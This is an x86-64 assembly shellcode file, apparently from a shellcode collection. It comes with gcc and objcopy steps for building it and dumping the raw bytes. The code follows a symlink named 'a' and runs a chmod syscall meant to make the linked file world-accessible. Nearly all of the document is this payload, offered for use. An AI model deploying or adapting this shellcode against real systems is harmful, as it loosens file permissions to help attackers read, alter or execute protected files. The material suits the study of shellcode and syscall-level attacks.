/*

Author: Abhinav Thakur
File:   chmod_symlink.s
Compile:        $ gcc -Wl,-N -nostdlib -static chmod_symlink.s -o ./chmod_symlink.elf
Dump shellcode :$ objcopy --dump-section .text=chmod_symlink.raw ./chmod_symlink.elf
Run            :$ ./chmod_symlink.elf

Prerequisite:
Create a symbolic link of file you wish to be "RWX" accessible to the world.
$ ln -s /file a

*/

.global _start
_start:
.intel_syntax noprefix

    /* chmod("a", 07); */
    push 0x61
    push rsp
    pop rdi
    push 07
    pop rsi
    push 90
    pop rax
    syscall
